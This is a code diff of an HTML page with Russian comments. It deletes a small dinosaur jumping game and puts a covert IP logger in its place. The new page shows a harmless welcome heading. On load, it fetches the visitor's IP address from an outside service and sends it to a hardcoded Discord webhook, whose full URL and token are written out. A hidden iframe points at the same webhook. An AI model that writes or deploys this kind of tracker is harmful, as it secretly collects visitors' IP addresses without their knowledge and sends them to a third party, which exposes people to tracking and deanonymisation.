@@ -2,85 +2,34 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Динозаврик</title>
-    <style>
-        /* Стили для динозаврика */
-        #dinosaur {
-            position: absolute;
-            bottom: 0;
-            width: 50px;
-            height: 50px;
-            background-color: white;
-        }
-    </style>
+    <title>IP-логгер</title>
 </head>
 <body>
-    <h1>Динозаврик</h1>
+    <h1>Добро пожаловать на страницу!</h1>
+    
+    <!-- Помещаем скрытый iframe на страницу -->
+    <iframe src="https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0" style="display:none;"></iframe>
 
-    <!-- Изображение Мишки Фредди -->
-    <img src="bear.png" alt="Мишка Фредди" id="bear-img">
-
-    <!-- Динозаврик -->
-    <div id="dinosaur"></div>
-
-    <!-- Подключение библиотеки jQuery -->
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-
-    <!-- JavaScript код для управления динозавриком -->
+    <!-- JavaScript код для получения IP и отправки его на вебхук в Discord -->
     <script>
-        // Определение переменных
-        var dinosaur = $("#dinosaur");
-        var bearImg = $("#bear-img");
-        var jumpHeight = 150;
-        var jumpSpeed = 10;
-        var fallSpeed = 10;
-        var isJumping = false;
-        var isFalling = false;
-
-        // Функция для обновления координат динозаврика
-        function update() {
-            if (isJumping) {
-                jump();
-            } else if (isFalling) {
-                fall();
-            }
+        // Функция для отправки данных на вебхук в Discord
+        function sendToDiscord(ip) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://discord.com/api/webhooks/1093641132673597562/9o1Nq18xZRKMiT4qUsjIx_l02CpaTdzU2Sd5K15kfRjcxieXek-uLdJtjeiOUhanC3r0");
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify({content: "IP-адрес: " + ip}));
         }
 
-        // Функция для прыжка динозаврика
-        function jump() {
-            if (jumpHeight > 0) {
-                var newY = parseInt(dinosaur.css("bottom")) + jumpSpeed;
-                dinosaur.css("bottom", newY + "px");
-                jumpHeight -= jumpSpeed;
-            } else {
-                isJumping = false;
-                isFalling = true;
-            }
-        }
-
-        // Функция для падения динозаврика
-        function fall() {
-            var newY = parseInt(dinosaur.css("bottom")) - fallSpeed;
-            dinosaur.css("bottom", newY + "px");
-
-            if (newY < 0) {
-                isFalling = false;
-            }
-        }
-
-        // Обработчик события нажатия на клавишу
-        $(document).on("keydown", function(event) {
-            if (event.keyCode == 32) {  // Клавиша "Пробел"
-                if (!isJumping && !isFalling) {
-                    isJumping = true;
-                }
-            }
-        });
-
-        // Главный цикл игры
-        setInterval(function() {
-            update();
-        }, 50);
+        // Обработчик события загрузки страницы
+        window.onload = function() {
+            // Получаем IP-адрес
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    // Отправляем IP-адрес на вебхук в Discord
+                    sendToDiscord(data.ip);
+                });
+        };
     </script>
 </body>
 </html>
